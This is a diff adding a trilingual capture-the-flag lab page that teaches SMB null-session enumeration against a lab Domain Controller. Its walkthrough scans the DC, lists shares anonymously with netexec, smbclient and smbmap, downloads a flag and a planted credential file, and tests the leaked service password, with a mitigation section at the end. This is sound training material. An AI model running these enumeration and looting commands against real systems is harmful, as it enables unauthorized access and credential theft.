@@ -1,0 +1,197 @@
+{% extends "base.html" %}
+{% block title %}AD01 – SMB Enumeration & Null Session – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_smb_enum_obj_desc">El Domain Controller acepta sesiones nulas y tiene la cuenta Guest habilitada: puedes listar recursos y enumerar usuarios sin credenciales. El recurso //DC01/public es legible de forma anónima y contiene la flag, además de las credenciales de servicio que necesitarás en el resto de laboratorios.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>//{{ ad_dc_host }}/public/flag-ad-01.txt</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la caja «Validar Flag» al final de esta página.</span></p>
+  </div>
+
+  {% set ad_show_foothold = false %}
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Servicios expuestos por el Domain Controller
+nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}
+
+# Recursos compartidos sin credenciales
+nxc smb {{ ad_dc_ip }} -u '' -p '' --shares</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Reconocimiento del Domain Controller</h3>
+    <p>Los puertos delatan un DC: Kerberos (88), LDAP (389/636), Global Catalog (3268) y SMB (445).</p>
+    <pre>nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}
+
+# El nombre del dominio también sale por SMB
+nxc smb {{ ad_dc_ip }}
+# SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})</pre>
+
+    <h3>2 · Sesión nula: listar recursos compartidos</h3>
+    <p>El servidor tiene <code>restrict anonymous = 0</code>, así que una sesión <strong>totalmente anónima</strong> (usuario y contraseña en blanco) lista los recursos. <strong>Importante</strong>: tiene que ser el usuario vacío — si indicas explícitamente <code>guest</code> como usuario, Samba intenta autenticar esa cuenta de verdad (no la trata como "bad user") y la sesión falla con <code>STATUS_LOGON_FAILURE</code>, aunque <code>map to guest = Bad User</code> sí mapee a invitado cualquier usuario que <em>no exista</em>.</p>
+    <pre># Con netexec (usuario y contraseña vacíos — no "guest" explícito)
+nxc smb {{ ad_dc_ip }} -u '' -p '' --shares
+
+# Con smbclient
+smbclient -N -L //{{ ad_dc_ip }}/
+
+# Con smbmap
+smbmap -H {{ ad_dc_ip }} -u '' -p ''</pre>
+    <p>Entre los recursos aparece <code>public</code> con permiso de lectura para todos.</p>
+
+    <h3>3 · Saquear el recurso anónimo</h3>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public
+smb: \&gt; ls
+smb: \&gt; get flag-ad-01.txt
+smb: \&gt; get IT_Onboarding.txt
+smb: \&gt; exit
+
+cat flag-ad-01.txt          # ← flag del laboratorio
+cat IT_Onboarding.txt   # ← credenciales de svc.readonly</pre>
+    <p>O en una sola línea, sin sesión interactiva:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt' 2&gt;/dev/null
+cat flag-ad-01.txt
+nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .</pre>
+
+    <h3>4 · Capturar la flag</h3>
+    <p>La flag está en <code>flag-ad-01.txt</code> del recurso <code>public</code>:</p>
+    <pre>HL{···}</pre>
+    <p>Y <code>IT_Onboarding.txt</code> te entrega el <em>foothold</em> con el que arrancan el resto de laboratorios de esta categoría:</p>
+    <pre>Usuario : svc.readonly
+Password: ReadOnly123!
+
+# Verifícalo:
+nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'</pre>
+    <p>Esa credencial es la que usarás en el siguiente laboratorio (AD02) para enumerar los usuarios del dominio — la enumeración anónima de usuarios (RID cycling con sesión nula o <code>guest</code>) no funciona contra este Domain Controller.</p>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Deshabilitar el acceso anónimo: <code>RestrictAnonymous = 1</code> y deshabilitar la cuenta Guest.</li>
+      <li>Nunca publicar credenciales en recursos compartidos; usar gMSA o un gestor de secretos.</li>
+      <li>Restringir el listado de recursos y auditar los accesos anónimos (evento 5140).</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">enum4linux-ng</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Domain Controller recon</h3>
+    <p>The open ports give the DC away: Kerberos (88), LDAP (389/636), Global Catalog (3268) and SMB (445).</p>
+    <pre>nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}
+
+# SMB also leaks the domain name
+nxc smb {{ ad_dc_ip }}
+# SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})</pre>
+
+    <h3>2 · Null session: list the shares</h3>
+    <p>The server ships <code>restrict anonymous = 0</code>, so a <strong>fully anonymous</strong> session (blank username and password) lists the shares. <strong>Important</strong>: it must be the blank user — if you explicitly pass <code>guest</code> as the username, Samba actually tries to authenticate that account instead of treating it as a "bad user", and the session fails with <code>STATUS_LOGON_FAILURE</code>, even though <code>map to guest = Bad User</code> does map any <em>nonexistent</em> username to guest.</p>
+    <pre># With netexec (blank username/password — not an explicit "guest")
+nxc smb {{ ad_dc_ip }} -u '' -p '' --shares
+
+# With smbclient
+smbclient -N -L //{{ ad_dc_ip }}/
+
+# With smbmap
+smbmap -H {{ ad_dc_ip }} -u '' -p ''</pre>
+    <p>A <code>public</code> share shows up, readable by everyone.</p>
+
+    <h3>3 · Loot the anonymous share</h3>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public
+smb: \&gt; ls
+smb: \&gt; get flag-ad-01.txt
+smb: \&gt; get IT_Onboarding.txt
+smb: \&gt; exit
+
+cat flag-ad-01.txt          # ← lab flag
+cat IT_Onboarding.txt   # ← svc.readonly credentials</pre>
+    <p>Or as a one-liner, no interactive session:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt' 2&gt;/dev/null
+cat flag-ad-01.txt
+nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .</pre>
+
+    <h3>4 · Capture the flag</h3>
+    <p>The flag lives in <code>flag-ad-01.txt</code> inside the <code>public</code> share:</p>
+    <pre>HL{···}</pre>
+    <p>And <code>IT_Onboarding.txt</code> hands you the foothold every other lab in this category starts from:</p>
+    <pre>User    : svc.readonly
+Password: ReadOnly123!
+
+# Verify it:
+nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'</pre>
+    <p>That credential is what you'll use in the next lab (AD02) to enumerate domain users — anonymous user enumeration (RID cycling with a null or <code>guest</code> session) does not work against this Domain Controller.</p>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Disable anonymous access: <code>RestrictAnonymous = 1</code> and disable the Guest account.</li>
+      <li>Never publish credentials on file shares; use gMSA or a secret manager.</li>
+      <li>Restrict share enumeration and audit anonymous access (event 5140).</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">enum4linux-ng</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>1 · Reconhecimento do Domain Controller</h3>
+    <p>As portas abertas revelam a presença do DC: Kerberos (88), LDAP (389/636), Global Catalog (3268) e SMB (445).</p>
+    <pre>nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}
+
+# SMB also leaks the domain name
+nxc smb {{ ad_dc_ip }}
+# SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})</pre>
+
+    <h3>2 · Sessão nula: listar compartilhamentos</h3>
+    <p>O servidor está configurado com <code>restrict anonymous = 0</code>, portanto uma sessão <strong>totalmente anônima</strong> (usuário e senha em branco) lista os compartilhamentos. <strong>Importante</strong>: o usuário deve ser em branco — se você passar explicitamente <code>guest</code> como usuário, o Samba tenta autenticar essa conta em vez de tratá-la como um "bad user", e a sessão falha com <code>STATUS_LOGON_FAILURE</code>, embora <code>map to guest = Bad User</code> mapeie qualquer usuário <em>inexistente</em> para guest.</p>
+    <pre># With netexec (blank username/password — not an explicit "guest")
+nxc smb {{ ad_dc_ip }} -u '' -p '' --shares
+
+# With smbclient
+smbclient -N -L //{{ ad_dc_ip }}/
+
+# With smbmap
+smbmap -H {{ ad_dc_ip }} -u '' -p ''</pre>
+    <p>Um compartilhamento <code>public</code> é exibido, com leitura aberta para todos.</p>
+
+    <h3>3 · Explorar o compartilhamento anônimo</h3>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public
+smb: \&gt; ls
+smb: \&gt; get flag-ad-01.txt
+smb: \&gt; get IT_Onboarding.txt
+smb: \&gt; exit
+
+cat flag-ad-01.txt          # ← lab flag
+cat IT_Onboarding.txt   # ← svc.readonly credentials</pre>
+    <p>Ou como comando único, sem sessão interativa:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt' 2&gt;/dev/null
+cat flag-ad-01.txt
+nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .</pre>
+
+    <h3>4 · Capturar a flag</h3>
+    <p>A flag está no arquivo <code>flag-ad-01.txt</code> dentro do compartilhamento <code>public</code>:</p>
+    <pre>HL{···}</pre>
+    <p>E o arquivo <code>IT_Onboarding.txt</code> entrega o ponto de partida (foothold) que todos os outros laboratórios desta categoria utilizam:</p>
+    <pre>User    : svc.readonly
+Password: ReadOnly123!
+
+# Verify it:
+nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'</pre>
+    <p>Essa credencial é a que você usará no próximo laboratório (AD02) para enumerar usuários do domínio — a enumeração anônima de usuários (cycling de RID com sessão nula ou <code>guest</code>) não funciona contra este Domain Controller.</p>
+
+    <h3>Mitigação</h3>
+    <ul>
+      <li>Desabilitar o acesso anônimo: <code>RestrictAnonymous = 1</code> e desabilitar a conta Guest.</li>
+      <li>Nunca disponibilizar credenciais em compartilhamentos de arquivos; usar gMSA ou um gerenciador de segredos.</li>
+      <li>Restringir a enumeração de compartilhamentos e auditar acessos anônimos (evento 5140).</li>
+    </ul>
+
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">enum4linux-ng</span></div>
+  </div>
+</div>
+{% endblock %}
